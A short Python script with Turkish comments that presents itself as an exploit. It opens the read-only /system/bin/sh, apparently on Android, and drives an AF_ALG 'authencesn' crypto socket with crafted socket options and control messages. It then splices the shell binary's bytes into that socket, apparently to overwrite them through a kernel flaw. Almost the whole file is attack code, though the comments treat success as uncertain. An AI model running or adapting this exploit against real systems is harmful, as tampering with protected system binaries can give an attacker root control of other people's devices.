#!/usr/bin/env python3
import os
import socket
import ctypes
import traceback

# 1. LIBC YÜKLEME
try:
    libc = ctypes.CDLL("libc.so")
except Exception:
    print("--- SISTEM HATASI (LIBC) ---")
    traceback.print_exc()
    exit(1)

_splice = libc.splice
_splice.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_long), ctypes.c_int, ctypes.POINTER(ctypes.c_long), ctypes.c_size_t, ctypes.c_uint]
_splice.restype = ctypes.c_int

def d(x): return bytes.fromhex(x)

# 2. HEDEF DOSYAYI AC
target = "/system/bin/sh"
try:
    fd = os.open(target, os.O_RDONLY)
except Exception:
    print(f"--- SISTEM HATASI (DOSYA ACMA: {target}) ---")
    traceback.print_exc()
    exit(1)

# 3. EXPLOIT FONKSIYONU (HATALARI OLDUĞU GİBİ BASAR)
def attempt():
    try:
        # Soket oluşturma
        sock = socket.socket(38, 5, 0) # AF_ALG
        sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        
        sock.setsockopt(279, 1, d('0800010000000010' + '0' * 64))
        sock.setsockopt(279, 5, None, 4)
        
        accept_sock, _ = sock.accept()
        
        # Veri gönderimi
        chunk = b"\x01\x00\x8d\xe2" # Örnek 4 byte
        msg_control = [(279, 3, b'\x00' * 4), (279, 2, b'\x10' + b'\x00' * 19), (279, 4, b'\x08' + b'\x00' * 3)]
        accept_sock.sendmsg([b"A" * 4 + chunk], msg_control, 32768)
        
        r, w = os.pipe()
        
        # Splice işlemleri
        off_in = ctypes.c_long(0)
        _splice(fd, ctypes.byref(off_in), w, None, 8, 0)
        _splice(r, None, accept_sock.fileno(), None, 8, 0)
        
        print("[+] Adım başarıyla tamamlandı (Mucize!)")

    except Exception:
        print("\n--- KERNEL/SISTEM TARAFINDAN DÖNDÜRÜLEN GERÇEK HATA ---")
        traceback.print_exc()
        return False
    return True

attempt()
